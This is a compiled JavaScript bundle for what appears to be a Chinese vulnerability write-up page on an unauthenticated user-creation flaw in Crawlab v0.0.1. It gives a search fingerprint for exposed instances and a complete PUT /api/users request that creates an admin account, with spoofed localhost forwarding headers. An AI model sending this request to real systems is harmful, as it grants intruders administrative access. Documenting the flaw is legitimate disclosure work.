(window.webpackJsonp=window.webpackJsonp||[]).push([[97],{2116:function(s,t,a){s.exports=a.p+"assets/img/1639304614319-67b65509-55dd-4205-98cd-1ebdfb164e7b-20220313133455667.fe98f2dd.png"},2117:function(s,t,a){s.exports=a.p+"assets/img/1639305087766-21949d4c-a274-45e2-b1ed-2b12a2b6450d.bf7acf9c.png"},2118:function(s,t,a){s.exports=a.p+"assets/img/1639305199370-192f958d-1a96-4842-8f12-7dc32376074d.501a8131.png"},2119:function(s,t,a){s.exports=a.p+"assets/img/1639305372407-b81e6efc-2dde-403e-a7ad-ce5d0dd7cfa9.3176ef68.png"},2120:function(s,t,a){s.exports=a.p+"assets/img/1639305414874-3dc8bd9e-1d3d-44a0-a8a1-8c0d6affcddb.e1f67a97.png"},3282:function(s,t,a){"use strict";a.r(t);var n=a(64),r=Object(n.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"crawlab-users-任意用户添加漏洞"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#crawlab-users-任意用户添加漏洞"}},[s._v("#")]),s._v(" Crawlab users 任意用户添加漏洞")]),s._v(" "),t("h2",{attrs:{id:"漏洞描述"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),t("p",[s._v("Crawlab users 的 api 存在任意用户添加，且添加为未授权接口，可通过添加后在后台进一步攻击")]),s._v(" "),t("h2",{attrs:{id:"漏洞影响"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v("Crawlab v0.0.1")]),t("br"),s._v(" "),t("h2",{attrs:{id:"网络测绘"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v('title="Crawlab"')]),t("br"),s._v(" "),t("h2",{attrs:{id:"漏洞复现"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),t("p",[s._v("登录页面")]),s._v(" "),t("p",[t("img",{attrs:{src:a(2116),alt:"img"}})]),s._v(" "),t("p",[s._v("首先查看路由位置 main.go 文件")]),s._v(" "),t("p",[t("img",{attrs:{src:a(2117),alt:"img"}})]),s._v(" "),t("div",{staticClass:"language-python line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-python"}},[t("code",[s._v("anonymousGrou 中为匿名可调用方法\nauthGroup\t  中为认证可调用方法\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("p",[s._v("可以看到 Putuser方法为添加用户，但存在匿名调用")]),s._v(" "),t("p",[t("img",{attrs:{src:a(2118),alt:"img"}})]),s._v(" "),t("p",[s._v("根据字段生成添加用户的请求")]),s._v(" "),t("div",{staticClass:"language-python line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-python"}},[t("code",[s._v("PUT "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("api"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("users HTTP"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.1")]),s._v("\nHost"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" \nContent"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Length"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("83")]),s._v("\nAccept"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" application"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("json"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" text"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("plain"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("\nUser"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Agent"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" Mozilla"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("5.0")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Macintosh"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" Intel Mac OS X "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("10_15_7")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" AppleWebKit"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("537.36")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("KHTML"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" like Gecko"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" Chrome"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("96.0")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v(".4664")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v(".93")]),s._v(" Safari"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("537.36")]),s._v("\nContent"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Type"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" application"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("json"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("charset"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("UTF"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("8")]),s._v("\nAccept"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Encoding"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" gzip"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" deflate\nAccept"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Language"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" zh"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("CN"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("zh"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("q"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.9")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("en"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("US"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("q"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.8")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("en"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("q"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.7")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("zh"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("TW"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("q"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.6")]),s._v("\nCookie"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" Hm_lvt_c35e3a563a06caee2524902c81975add"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1639222117")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1639278935")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" Hm_lpvt_c35e3a563a06caee2524902c81975add"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1639278935")]),s._v("\nx"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("forwarded"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v(".1")]),s._v("\nx"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("originating"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("ip"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v(".1")]),s._v("\nx"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("remote"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("ip"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v(".1")]),s._v("\nx"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("remote"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("addr"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v(".1")]),s._v("\nConnection"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" close\n\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"username"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"testppp"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"password"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"testppp"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"role"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"admin"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"email"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"testppp@qq.com"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br")])]),t("p",[t("img",{attrs:{src:a(2119),alt:"img"}})]),s._v(" "),t("p",[t("img",{attrs:{src:a(2120),alt:"img"}})])],1)}),[],!1,null,null,null);t.default=r.exports}}]);